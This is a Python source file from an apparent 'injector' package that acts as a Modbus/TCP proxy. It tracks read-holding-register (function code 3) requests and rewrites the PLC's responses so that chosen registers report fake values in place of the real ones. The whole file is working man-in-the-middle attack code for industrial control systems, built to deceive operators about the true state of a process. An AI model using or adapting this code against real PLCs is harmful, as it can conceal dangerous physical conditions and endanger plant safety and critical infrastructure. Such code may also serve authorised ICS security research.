# injector/modbus_proxy/spoof_fc3.py
from __future__ import annotations
from typing import Optional
from injector.core.config import PlcConfig

from injector.modbus_proxy.framing import mbap_parts, rebuild_mbap, u16, p16
from injector.modbus_proxy.state import ConnState, PendingReq
from injector.modbus_proxy.rules import SpoofRule

def record_fc3_request(state: ConnState, frame: bytes) -> None:
    tid, pid, length, unit_id, pdu = mbap_parts(frame)
    if not pdu:
        return
    func = pdu[0]
    if func != 3 or len(pdu) < 5:
        return
    start = u16(pdu[1:3])
    count = u16(pdu[3:5])
    state.put(tid, PendingReq(func=func, start_addr=start, count=count))

def spoof_fc3_response(cfg: PlcConfig, state: ConnState, frame: bytes, rule: SpoofRule) -> bytes:
    tid, pid, length, unit_id, pdu = mbap_parts(frame)
    if not pdu:
        return frame

    func = pdu[0]
    if func & 0x80:
        return frame
    if func != 3:
        return frame

    req = state.pop(tid)
    if req is None or len(pdu) < 2:
        return frame

    byte_count = pdu[1]
    data = bytearray(pdu[2:])
    expected = req.count * 2

    if byte_count != len(data) or len(data) < 2:
        return frame

    for i in range(0, min(len(data), expected), 2):
        reg_index = i // 2
        addr = req.start_addr + reg_index
        if rule.should_spoof(cfg, addr):
            real_val = u16(data[i:i+2])
            fake_val = rule.spoof_value(cfg, addr, real_val)
            data[i:i+2] = p16(fake_val)

    new_pdu = bytes([3, byte_count]) + bytes(data)
    return rebuild_mbap(tid, pid, unit_id, new_pdu)
